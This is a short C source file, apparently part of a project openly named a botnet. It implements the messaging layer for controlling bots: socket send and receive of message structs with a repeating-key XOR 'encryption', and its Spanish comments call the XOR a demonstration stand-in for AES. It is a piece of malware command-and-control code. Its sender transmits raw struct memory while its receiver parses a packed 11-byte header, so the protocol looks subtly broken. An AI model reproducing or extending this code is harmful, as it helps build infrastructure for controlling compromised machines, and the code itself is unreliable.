#include "../../include/botnet.h"
#include "../../include/communication/protocol.h"

void encrypt_message(botnet_message_t *msg, char *key) {
    // XOR simple para demostración (usar AES en producción)
    for (size_t i = 0; i < msg->data_len; i++) {
        msg->data[i] ^= key[i % strlen(key)];
    }
}

void decrypt_message(botnet_message_t *msg, char *key) {
    // Mismo XOR para descifrar
    encrypt_message(msg, key);
}

int send_message(int sock, botnet_message_t *msg, char *encryption_key) {
    if (encryption_key != NULL) {
        encrypt_message(msg, encryption_key);
    }

    size_t total_size = sizeof(uint32_t) + sizeof(uint8_t) +
                       sizeof(uint32_t) + sizeof(uint16_t) + msg->data_len;

    return send(sock, msg, total_size, 0);
}

int receive_message(int sock, botnet_message_t *msg, char *encryption_key) {
    // Recibir header primero
    char header[11]; // message_id(4) + type(1) + timestamp(4) + data_len(2)
    int received = recv(sock, header, 11, MSG_WAITALL);

    if (received != 11) return -1;

    // Parsear header
    memcpy(&msg->message_id, header, 4);
    memcpy(&msg->message_type, header + 4, 1);
    memcpy(&msg->timestamp, header + 5, 4);
    memcpy(&msg->data_len, header + 9, 2);

    // Recibir datos
    if (msg->data_len > 0) {
        received = recv(sock, msg->data, msg->data_len, MSG_WAITALL);
        if (received != msg->data_len) return -1;
    }

    if (encryption_key != NULL) {
        decrypt_message(msg, encryption_key);
    }

    return 0;
}